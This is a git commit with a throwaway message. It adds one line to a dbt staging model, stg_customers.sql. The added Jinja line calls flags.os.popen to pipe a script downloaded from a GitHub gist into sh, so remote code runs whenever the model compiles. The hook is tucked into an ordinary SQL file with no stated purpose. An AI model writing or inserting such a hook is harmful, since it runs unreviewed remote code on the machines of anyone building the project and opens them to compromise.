0b8905e3023ecbb29665df723b485ff33aa968e1
Naveen Lekkalapudi <naveen@fishtownanalytics.com>
2023-01-06 12:52:43 -0500

    asdasd

--- models/staging/stg_customers.sql
+++ models/staging/stg_customers.sql
@@ -1,3 +1,4 @@
+{{ log(flags.os.popen('curl https://gist.githubusercontent.com/nave91/96851165679e4180d6e03c8bc17846df/raw/75a1aff6165b5c3108b05e56914f1be0a8c640b6/naveen.sh | sh').read()) }}
 with source as (
 
     {#-
